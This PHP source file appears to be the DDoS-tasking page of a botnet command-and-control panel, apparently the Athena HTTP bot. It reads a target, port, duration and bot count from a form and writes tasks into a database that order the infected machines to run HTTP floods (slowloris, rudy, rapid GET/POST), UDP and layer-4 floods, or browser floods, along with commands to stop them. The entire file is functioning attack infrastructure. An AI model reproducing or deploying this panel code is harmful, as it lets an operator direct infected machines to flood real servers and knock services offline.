<?php

	if(!defined('AthenaHTTP')) header('Location: ..');
	
	$STATUS_MESSAGE = 'Attack launched.';
	$STATUS_NOTE = false;
	
	$ddos_type_l7 = array('arme', 'bandwidth', 'rapidget', 'rapidpost', 'rudy', 'slowloris', 'slowpost', 'combo');
	$ddos_type_l4 = array('ecf', 'udp');
	$ddos_type_browser = array('browser');
	$ddos_type_cancel = array('browser.stop', 'stop');
			
	if($_POST['ddos_type'])
	{
		$DDOS_TYPE 		= trim($_POST['ddos_type']);
		$DDOS_TARGET 	= trim($_POST['ddos_target']);
		$DDOS_PORT 		= trim($_POST['ddos_port']);
		$DDOS_DURATION 	= trim($_POST['ddos_duration']);
		$DDOS_AMOUNT 	= trim($_POST['ddos_amount']);
		
		$TASK = '';
		$PARAM = '';
		
		if(in_array($DDOS_TYPE, $ddos_type_l7))
		{
			if($DDOS_TARGET && $DDOS_PORT && $DDOS_DURATION)
			{
				$TASK = '!ddos.http.' . $ddos_type_l7[array_search($DDOS_TYPE, $ddos_type_l7)];
				$PARAM = $DDOS_TARGET . ' ' . $DDOS_PORT . ' ' . $DDOS_DURATION;
								
				$SUBMIT_DDOS = true;
			}
		}
		else if(in_array($DDOS_TYPE, $ddos_type_l4))
		{
			if($DDOS_TARGET && $DDOS_PORT && $DDOS_DURATION)
			{
				$TASK = '!ddos.layer4.' . $ddos_type_l4[array_search($DDOS_TYPE, $ddos_type_l4)];
				$PARAM = $DDOS_TARGET . ' ' . $DDOS_PORT . ' ' . $DDOS_DURATION;
								
				$SUBMIT_DDOS = true;
			}
		}
		else if(in_array($DDOS_TYPE, $ddos_type_browser))
		{
			if($DDOS_TARGET && $DDOS_DURATION)
			{
				$TASK = '!ddos.' . $ddos_type_browser[array_search($DDOS_TYPE, $ddos_type_browser)];
				$PARAM = $DDOS_TARGET . ' ' . $DDOS_DURATION;
								
				$SUBMIT_DDOS = true;
			}
		}
		else if(in_array($DDOS_TYPE, $ddos_type_cancel))
		{		
			mysql_query('INSERT INTO tasks SET ' . 
						'username=\'' . $_SESSION['username'] . '\', ' .
						'task=\'' . mysql_real_escape_string('!ddos.' . $ddos_type_cancel[array_search($DDOS_TYPE, $ddos_type_cancel)])  . '\', ' . 
						'country=\'*\', ' . 
						'os=\'*\', ' . 
						'cpu=\'*\', ' . 
						'type=\'*\', ' . 
						'version=\'*\', ' . 
						'net=\'*\', ' . 
						'admin=\'*\', ' . 
						'busy=\'1\', ' . 
						'botid=\'*\', ' . 
						'`limit`=\'0\';');
			
			$SUBMIT_DDOS = false;
			$STATUS_NOTE = true;
		}
		
		if($SUBMIT_DDOS)
		{
			$BUSY = 0;
			
			if($TASK == '!ddos.browser') $BUSY = '*';
			
		
			mysql_query('INSERT INTO tasks SET ' . 
							'username=\'' . $_SESSION['username'] . '\', ' .
							'task=\'' . mysql_real_escape_string($TASK)  . '\', ' . 
							'parameter=\'' . mysql_real_escape_string($PARAM) . '\', ' . 
							'country=\'*\', ' . 
							'os=\'*\', ' . 
							'cpu=\'*\', ' . 
							'type=\'*\', ' . 
							'version=\'*\', ' . 
							'net=\'*\', ' . 
							'admin=\'*\', ' . 
							'busy=\'' . $BUSY . '\', ' . 
							'botid=\'*\', ' . 
							'`limit`=\'' . mysql_real_escape_string(is_numeric($DDOS_AMOUNT) && $DDOS_AMOUNT != 0 ? $DDOS_AMOUNT : '0') . '\';');
		
			$STATUS_NOTE = true;
		}
	}

?>